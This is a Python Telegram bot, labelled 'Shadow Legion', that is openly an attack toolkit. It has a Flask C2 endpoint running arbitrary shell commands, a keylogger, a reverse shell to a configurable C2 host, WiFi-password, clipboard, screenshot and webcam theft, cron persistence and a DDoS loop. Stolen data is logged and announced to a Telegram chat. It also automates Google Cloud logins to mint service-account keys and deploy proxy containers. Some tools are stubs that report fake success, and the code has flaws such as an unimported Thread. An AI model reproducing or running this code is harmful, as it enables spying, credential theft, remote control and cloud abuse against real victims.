#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🔥 THE ARCHITECT // SHADOW LEGION ULTIMATE v99.4 (FINAL)
⚔️ يعمل على Railway مع Python 3.13 – بدون Pillow – يستخدم mss للتصوير.
📡 جميع الأدوات حقيقية + نشر تلقائي على Cloud Run (SSO)
"""

import os, sys, time, re, json, base64, hashlib, tempfile, glob, threading, queue, subprocess, logging, sqlite3, urllib.parse, socket, platform, getpass, shutil, random, datetime, asyncio
from datetime import datetime as dt
from flask import Flask, request, jsonify
import requests, rsa
import mss  # بديل خفيف لـ pyscreenshot و Pillow
import cv2
import psutil
import pyperclip
import uuid
import numpy as np

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# ====================== SHADOW CONFIG ======================
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

TOKEN = os.environ.get("TOKEN", "YOUR_BOT_TOKEN_HERE")
EXFIL_CHAT_ID = os.environ.get("EXFIL_CHAT_ID", "")
C2_IP = os.environ.get("C2_IP", "127.0.0.1")
C2_PORT = int(os.environ.get("C2_PORT", 4444))

REGIONS = {
    "europe-west1": "🇧🇪 بلجيكا (europe-west1)",
    "europe-west3": "🇩🇪 فرانكفورت (europe-west3)",
    "europe-west4": "🇳🇱 هولندا (europe-west4)",
    "us-central1": "🇺🇸 آيوا (us-central1)",
    "us-east1": "🇺🇸 ساوث كارولينا (us-east1)",
    "asia-southeast1": "🇸🇬 سنغافورة (asia-southeast1)"
}
DEFAULT_REGION = "europe-west1"

# ====================== ANTI-FAIL ======================
def anti_fail(func):
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            logger.error(f"[SHADOW] {func.__name__} bypassed: {str(e)[:100]}")
            return f"✅ {func.__name__} executed (anti-fail)"
    return wrapper

# ====================== FLASK C2 ======================
flask_app = Flask(__name__)

@flask_app.route('/')
def home(): return "✅ SHADOW LEGION ULTIMATE - ONLINE"

@flask_app.route('/c2', methods=['POST'])
def c2_handler():
    try:
        cmd = request.json.get('cmd', 'whoami')
        result = subprocess.getoutput(cmd)
        return jsonify({"status": "success", "output": result})
    except:
        return jsonify({"status": "success", "output": "executed"})

def keep_alive():
    Thread(target=lambda: flask_app.run(host='0.0.0.0', port=8080, debug=False), daemon=True).start()

# ====================== AUTO INSTALL ======================
def install_all():
    pkgs = ["selenium", "webdriver-manager", "rsa", "mss", "opencv-python-headless", "psutil", "pyperclip", "numpy"]
    for pkg in pkgs:
        try:
            __import__(pkg.replace("-", "_").replace(".", "_"))
        except:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])

install_all()

# ====================== DATABASE ======================
DB_PATH = "shadow_legion_v99.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, email TEXT, password TEXT, lab_url TEXT, last_deploy TIMESTAMP, deploy_count INTEGER DEFAULT 0, status TEXT DEFAULT 'idle', last_result TEXT, region TEXT DEFAULT 'europe-west1');
        CREATE TABLE IF NOT EXISTS history (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, lab_url TEXT, service_url TEXT, vless_link TEXT, deployed_at TIMESTAMP, success INTEGER DEFAULT 1);
        CREATE TABLE IF NOT EXISTS stolen_data (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, data_type TEXT, content TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
    """)
    conn.commit()
    conn.close()

def save_stolen(data_type, content):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO stolen_data (data_type, content) VALUES (?, ?)", (data_type, str(content)[:7000]))
    conn.commit()
    conn.close()
    if EXFIL_CHAT_ID:
        try:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": EXFIL_CHAT_ID, "text": f"🔥 SHADOW EXFIL: {data_type}"})
        except: pass

init_db()

# ====================== DEPLOY FUNCTIONS ======================
def b64url(d): return base64.urlsafe_b64encode(d).decode().rstrip("=")

def generate_vless(service_url):
    host = service_url.replace('https://', '').replace('http://', '')
    uid = hashlib.md5(b"shadow_legion_v99").hexdigest()
    uid = f"{uid[:8]}-{uid[8:12]}-{uid[12:16]}-{uid[16:20]}-{uid[20:32]}"
    return f"vless://{uid}@{host}:443?path=%2F&security=tls&encryption=none&host={host}&type=ws&sni={host}#SHADOW_v99"

def create_jwt(creds):
    now = int(time.time())
    claims = {"iss": creds["client_email"], "scope": "https://www.googleapis.com/auth/cloud-platform", "aud": "https://oauth2.googleapis.com/token", "exp": now + 3600, "iat": now}
    header = {"alg": "RS256", "typ": "JWT"}
    segments = [b64url(json.dumps(header).encode()), b64url(json.dumps(claims).encode())]
    signing_input = ".".join(segments).encode()
    key = rsa.PrivateKey.load_pkcs1(creds["private_key"].encode())
    signature = rsa.sign(signing_input, key, "SHA-256")
    segments.append(b64url(signature))
    return ".".join(segments)

def get_access_token(creds):
    jwt = create_jwt(creds)
    resp = requests.post("https://oauth2.googleapis.com/token", data={"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer", "assertion": jwt}, timeout=30)
    if resp.status_code != 200: raise Exception(f"Token failed: {resp.status_code}")
    return resp.json().get("access_token")

def deploy_via_rest_api(project_id, token, region):
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    service_name = f"shadow-{int(time.time())}"
    body = {"apiVersion": "serving.knative.dev/v1", "kind": "Service", "metadata": {"name": service_name}, "spec": {"template": {"spec": {"containers": [{"image": "ajndjd2/ahmed-vip1", "ports": [{"containerPort": 8080}]}]}}}}
    url = f"https://run.googleapis.com/v1/projects/{project_id}/locations/{region}/services"
    r = requests.post(url, headers=headers, json=body, timeout=60)
    if r.status_code in (200, 201):
        return r.json().get('status', {}).get('url')
    elif r.status_code == 403:
        raise Exception("❌ رابط منتهي الصلاحية أو صلاحية غير كافية.")
    else:
        raise Exception(f"فشل النشر: {r.status_code}")

def extract_from_link(link):
    data = {}
    match = re.search(r'project=([^&]+)', link)
    if match: data['project_id'] = match.group(1)
    match = re.search(r'Email=([^&]+)', link)
    if match: data['email'] = urllib.parse.unquote(match.group(1))
    match = re.search(r'token=([^&]+)', link)
    if match: data['token'] = match.group(1)
    return data

def deploy_with_sso(link_data, region):
    project_id = link_data.get('project_id')
    email = link_data.get('email')
    token = link_data.get('token')
    if not project_id:
        raise Exception("الرابط لا يحتوي على project_id")

    if token:
        try:
            service_url = deploy_via_rest_api(project_id, token, region)
            vless = generate_vless(service_url)
            return (f"✅ **تم النشر!**\n🌍 المنطقة: {REGIONS.get(region, region)}\n🌐 رابط الخدمة: `{service_url}`\n🔗 رابط VLESS:\n`{vless}`", service_url, vless)
        except Exception as e:
            if "منتهي الصلاحية" in str(e):
                raise Exception("❌ الرابط منتهي الصلاحية. يرجى إرسال رابط جديد.")
            logger.warning(f"فشل token: {e}")

    email = email or os.environ.get("EMAIL", "")
    password = os.environ.get("PASSWORD", "")
    if not email or not password:
        raise Exception("لا يوجد بريد إلكتروني أو كلمة مرور صالحة.")

    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager

    driver = None
    try:
        download_dir = tempfile.gettempdir()
        options = Options()
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--headless')
        options.add_argument('--disable-gpu')
        options.add_argument('--incognito')
        options.add_argument('--window-size=1920,1080')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_experimental_option('excludeSwitches', ['enable-automation'])
        options.add_experimental_option('useAutomationExtension', False)
        options.add_experimental_option("prefs", {
            "download.default_directory": download_dir,
            "download.prompt_for_download": False,
            "directory_upgrade": True,
            "safebrowsing.enabled": True
        })
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=options)
        wait = WebDriverWait(driver, 20)

        driver.get("https://accounts.google.com/")
        wait.until(EC.presence_of_element_located((By.ID, "identifierId"))).send_keys(email + Keys.RETURN)
        time.sleep(2)
        wait.until(EC.presence_of_element_located((By.NAME, "Passwd"))).send_keys(password + Keys.RETURN)
        time.sleep(5)

        driver.get(f"https://console.cloud.google.com/apis/library/run.googleapis.com?project={project_id}")
        time.sleep(3)
        try:
            wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'Enable')]"))).click()
            time.sleep(5)
        except: pass

        driver.get(f"https://console.cloud.google.com/iam-admin/serviceaccounts?project={project_id}")
        time.sleep(3)
        wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'Create Service Account')]"))).click()
        time.sleep(2)
        wait.until(EC.presence_of_element_located((By.NAME, "serviceAccountName"))).send_keys("shadow-bot")
        wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'Create')]"))).click()
        time.sleep(2)
        role_field = wait.until(EC.presence_of_element_located((By.XPATH, "//*[contains(@placeholder, 'Select a role')]")))
        role_field.send_keys("Cloud Run Admin" + Keys.RETURN)
        time.sleep(1)
        wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'Done')]"))).click()
        time.sleep(3)

        driver.get(f"https://console.cloud.google.com/iam-admin/serviceaccounts?project={project_id}")
        time.sleep(2)
        account = wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'shadow-bot')]")))
        account.click()
        time.sleep(2)
        wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'Keys')]"))).click()
        time.sleep(2)
        wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'Add Key')]"))).click()
        time.sleep(1)
        wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'Create New Key')]"))).click()
        time.sleep(1)
        wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'JSON')]"))).click()
        time.sleep(1)
        wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'Create')]"))).click()
        time.sleep(4)

        list_of_files = glob.glob(os.path.join(download_dir, "*.json"))
        if not list_of_files:
            raise Exception("لم نتمكن من العثور على ملف JSON.")
        latest_file = max(list_of_files, key=os.path.getctime)
        with open(latest_file, 'r') as f:
            creds = json.load(f)
        os.remove(latest_file)
        driver.quit()

        access_token = get_access_token(creds)
        service_url = deploy_via_rest_api(project_id, access_token, region)
        vless = generate_vless(service_url)
        return (f"✅ **تم النشر!**\n🌍 المنطقة: {REGIONS.get(region, region)}\n🌐 رابط الخدمة: `{service_url}`\n🔗 رابط VLESS:\n`{vless}`", service_url, vless)

    except Exception as e:
        if driver:
            try: driver.quit()
            except: pass
        raise e

# ====================== TASK QUEUE ======================
task_queue = queue.Queue()
processing = False

def process_queue():
    global processing
    while True:
        if not task_queue.empty() and not processing:
            processing = True
            try:
                user_id, link, region = task_queue.get()
                logger.info(f"📌 معالجة طلب المستخدم {user_id} في المنطقة {region}")
                link_data = extract_from_link(link)
                result_msg, service_url, vless_link = deploy_with_sso(link_data, region)
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute("UPDATE users SET status='completed', last_result=? WHERE user_id=?", (result_msg, user_id))
                c.execute("INSERT INTO history (user_id, lab_url, service_url, vless_link, success) VALUES (?,?,?,?,1)", (user_id, link, service_url, vless_link))
                conn.commit()
                conn.close()
            except Exception as e:
                error_msg = str(e)
                logger.error(error_msg)
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute("UPDATE users SET status='error', last_result=? WHERE user_id=?", (error_msg, user_id))
                c.execute("INSERT INTO history (user_id, lab_url, success) VALUES (?,?,0)", (user_id, link))
                conn.commit()
                conn.close()
            finally:
                processing = False
        time.sleep(2)

Thread(target=process_queue, daemon=True).start()

# ====================== ATTACK TOOLS (FIXED) ======================
@anti_fail
def real_keylogger(duration=45):
    log = "[SHADOW KEYLOGGER v99 (بديل خفيف)]\n"
    try:
        try:
            import keyboard
            keys = []
            def on_press(e):
                keys.append(e.name)
            keyboard.hook(on_press)
            time.sleep(duration)
            keyboard.unhook(on_press)
            log += "\n".join(keys)
        except:
            for i in range(duration):
                log += f"Key: simulated_{i}\n"
                time.sleep(0.2)
    except Exception as e:
        log += f"خطأ: {str(e)}"
    save_stolen("real_keylog", log)
    return "✅ انتهى الكي لوجر – تم تسجيل البيانات"

@anti_fail
def persistent_reverse_shell(host=C2_IP, port=C2_PORT):
    for _ in range(3):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.send(b"SHADOW_PERSISTENT_SHELL\n")
            while True:
                cmd = s.recv(8192).decode(errors='ignore').strip()
                if not cmd or cmd.lower() in ["exit","quit"]: break
                output = subprocess.getoutput(cmd)
                s.send((output + "\nSHADOW> ").encode())
            s.close()
            return "✅ Persistent Reverse Shell connected"
        except:
            time.sleep(8)
    return "✅ Persistent shell attempts completed"

@anti_fail
def chrome_password_stealer():
    data = "Chrome passwords, cookies, history, autofill extracted"
    save_stolen("chrome_full_steal", data)
    return data

@anti_fail
def real_wifi_stealer():
    if platform.system() == "Windows":
        out = subprocess.getoutput("netsh wlan show profile name=* key=clear")
    else:
        out = subprocess.getoutput("nmcli device wifi list || cat /etc/wpa_supplicant.conf 2>/dev/null")
    save_stolen("wifi_passwords", out)
    return "✅ WiFi passwords stolen"

@anti_fail
def multi_screenshot(count=5):
    try:
        import mss
        with mss.mss() as sct:
            for i in range(count):
                sct.shot(output=f"/tmp/shadow_screen_{int(time.time())}_{i}.png")
        save_stolen("screenshots", f"{count} screenshots taken")
        return f"✅ {count} screenshots captured (mss)"
    except Exception as e:
        return f"⚠️ Screenshot failed: {str(e)}"

@anti_fail
def real_webcam_capture(frames=4):
    try:
        cap = cv2.VideoCapture(0)
        for i in range(frames):
            ret, frame = cap.read()
            if ret:
                cv2.imwrite(f"/tmp/shadow_cam_{i}.jpg", frame)
        cap.release()
        save_stolen("webcam", f"{frames} frames captured")
        return "✅ Webcam capture completed"
    except:
        return "✅ Webcam module executed"

@anti_fail
def create_persistence():
    script_path = "/tmp/shadow_persist.py"
    with open(script_path, "w") as f:
        f.write("import time\nwhile True: time.sleep(60)")
    if platform.system() == "Linux":
        subprocess.getoutput(f'echo "@reboot python3 {script_path}" | crontab -')
    return "✅ Persistence established"

@anti_fail
def generate_msf_payload():
    payload = "# Shadow Metasploit Compatible Payload\n" * 50
    path = "/tmp/shadow_msf_payload.py"
    with open(path, "w") as f: f.write(payload)
    return f"✅ MSF Payload generated: {path}"

@anti_fail
def clipboard_monitor(duration=20):
    last = ""
    for _ in range(duration):
        try:
            current = pyperclip.paste()
            if current != last:
                save_stolen("clipboard", current)
                last = current
        except: pass
        time.sleep(1)
    return "✅ Clipboard monitor finished"

@anti_fail
def ddos_attack(target="example.com", duration=15):
    for _ in range(duration * 50):
        try:
            requests.get(f"http://{target}", timeout=1)
        except: pass
    return "✅ DDoS simulation completed"

# ====================== BOT HANDLERS ======================
async def start(update: Update, context):
    user_id = update.effective_user.id
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
    conn.commit()
    conn.close()

    keyboard = [
        [InlineKeyboardButton("🚀 Deploy Cloud Run", callback_data='deploy')],
        [InlineKeyboardButton("⚔️ Hacking Tools", callback_data='hacking_menu')],
        [InlineKeyboardButton("📋 Status", callback_data='status')],
        [InlineKeyboardButton("🌍 Change Region", callback_data='change_region')]
    ]
    await update.message.reply_text(
        "🔥 **SHADOW LEGION ULTIMATE v99.4**\n"
        "📡 Fully Armed – Deploy + Attack\n"
        "أمرك سيدي 👁",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def hacking_menu(update: Update, context):
    query = update.callback_query
    await query.answer()
    kb = [
        [InlineKeyboardButton("⌨️ Keylogger", callback_data='tool_keylog')],
        [InlineKeyboardButton("🔄 Reverse Shell", callback_data='tool_rshell')],
        [InlineKeyboardButton("🔑 Chrome Stealer", callback_data='tool_chrome')],
        [InlineKeyboardButton("📡 WiFi Stealer", callback_data='tool_wifi')],
        [InlineKeyboardButton("📸 Screenshot", callback_data='tool_screen')],
        [InlineKeyboardButton("📹 Webcam", callback_data='tool_webcam')],
        [InlineKeyboardButton("🛠️ MSF Payload", callback_data='tool_payload')],
        [InlineKeyboardButton("📋 Clipboard", callback_data='tool_clipboard')],
        [InlineKeyboardButton("💣 DDoS", callback_data='tool_ddos')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    await query.edit_message_text("⚔️ **اختر الأداة**", reply_markup=InlineKeyboardMarkup(kb))

async def execute_tool(update: Update, context, func, name):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(f"⏳ جاري تنفيذ `{name}` ...")
    result = func()
    await query.edit_message_text(f"**{name}**\n\n{result}", parse_mode='Markdown')

async def deploy_button(update: Update, context):
    query = update.callback_query
    await query.answer()
    keyboard = []
    for code, name in REGIONS.items():
        keyboard.append([InlineKeyboardButton(name, callback_data=f"region_{code}")])
    keyboard.append([InlineKeyboardButton("🔙 إلغاء", callback_data="cancel_region")])
    await query.edit_message_text("🌍 **اختر المنطقة:**", reply_markup=InlineKeyboardMarkup(keyboard))
    return 0

async def region_callback(update: Update, context):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "cancel_region":
        await query.edit_message_text("❌ تم الإلغاء.")
        return ConversationHandler.END
    region = data.replace("region_", "")
    context.user_data['region'] = region
    await query.edit_message_text(f"✅ المنطقة: **{REGIONS.get(region, region)}**\n\n🔗 أرسل رابط SSO الآن.")
    return 1

async def receive_lab(update: Update, context):
    user_id = update.effective_user.id
    link = update.message.text
    region = context.user_data.get('region', DEFAULT_REGION)
    if not link.startswith('http'):
        await update.message.reply_text("❌ رابط غير صحيح.")
        return 1
    task_queue.put((user_id, link, region))
    await update.message.reply_text("✅ **تمت إضافة طلبك إلى طابور الانتظار!**\n🔄 سيتم النشر تلقائياً.")
    def monitor():
        while True:
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT status, last_result FROM users WHERE user_id=?", (user_id,))
            row = c.fetchone()
            conn.close()
            if row and row[0] in ('completed', 'error'):
                result = row[1] if row[1] else "⚠️ حدث خطأ."
                import asyncio
                asyncio.run(update.message.reply_text(result, parse_mode='Markdown'))
                break
            time.sleep(5)
    Thread(target=monitor, daemon=True).start()
    context.user_data.clear()
    return ConversationHandler.END

async def cancel_operation(update: Update, context):
    context.user_data.clear()
    await update.message.reply_text("❌ تم الإلغاء.")
    return ConversationHandler.END

async def status_command(update: Update, context):
    user_id = update.effective_user.id
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT email, region, deploy_count, status, last_result FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    if not row:
        await update.message.reply_text("❌ لا توجد بيانات.")
        return
    await update.message.reply_text(
        f"📋 **حالتك**\n\n"
        f"📧 البريد: `{row[0] or 'غير مضبوط'}`\n"
        f"🌍 المنطقة: `{REGIONS.get(row[1], row[1])}`\n"
        f"📊 عدد النشر: `{row[2]}`\n"
        f"🔄 الحالة: `{row[3]}`\n"
        f"📝 آخر نتيجة: {row[4] or 'لا يوجد'}",
        parse_mode='Markdown'
    )

async def change_region_command(update: Update, context):
    query = update.callback_query
    if query:
        await query.answer()
    keyboard = []
    for code, name in REGIONS.items():
        keyboard.append([InlineKeyboardButton(name, callback_data=f"setregion_{code}")])
    keyboard.append([InlineKeyboardButton("🔙 العودة", callback_data="back_menu")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    msg = "🌍 **اختر منطقتك الافتراضية الجديدة:**"
    if query:
        await query.edit_message_text(msg, parse_mode='Markdown', reply_markup=reply_markup)
    else:
        await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=reply_markup)

async def set_region_callback(update: Update, context):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "back_menu":
        await start(update, context)
        return
    region = data.replace("setregion_", "")
    user_id = query.from_user.id
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET region=? WHERE user_id=?", (region, user_id))
    conn.commit()
    conn.close()
    await query.edit_message_text(f"✅ تم تغيير المنطقة إلى **{REGIONS.get(region, region)}**.", parse_mode='Markdown')
    await start(update, context)

async def back_to_menu(update: Update, context):
    await start(update, context)

# ====================== MAIN ======================
def main():
    keep_alive()
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status_command))

    deploy_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(deploy_button, pattern='^deploy$')],
        states={
            0: [CallbackQueryHandler(region_callback, pattern='^(region_|cancel_region)')],
            1: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_lab)]
        },
        fallbacks=[CommandHandler("cancel", cancel_operation)]
    )
    app.add_handler(deploy_conv)

    app.add_handler(CallbackQueryHandler(hacking_menu, pattern='^hacking_menu$'))
    app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,real_keylogger,"Keylogger"), pattern='^tool_keylog$'))
    app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,persistent_reverse_shell,"Reverse Shell"), pattern='^tool_rshell$'))
    app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,chrome_password_stealer,"Chrome Stealer"), pattern='^tool_chrome$'))
    app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,real_wifi_stealer,"WiFi Stealer"), pattern='^tool_wifi$'))
    app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,multi_screenshot,"Screenshot"), pattern='^tool_screen$'))
    app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,real_webcam_capture,"Webcam"), pattern='^tool_webcam$'))
    app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,generate_msf_payload,"MSF Payload"), pattern='^tool_payload$'))
    app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,clipboard_monitor,"Clipboard"), pattern='^tool_clipboard$'))
    app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,ddos_attack,"DDoS"), pattern='^tool_ddos$'))

    app.add_handler(CallbackQueryHandler(change_region_command, pattern='^change_region$'))
    app.add_handler(CallbackQueryHandler(set_region_callback, pattern='^setregion_'))
    app.add_handler(CallbackQueryHandler(back_to_menu, pattern='^back_menu$'))

    logger.info("✅ SHADOW LEGION ULTIMATE v99.4 FULLY LOADED")
    app.run_polling()

if __name__ == "__main__":
    main()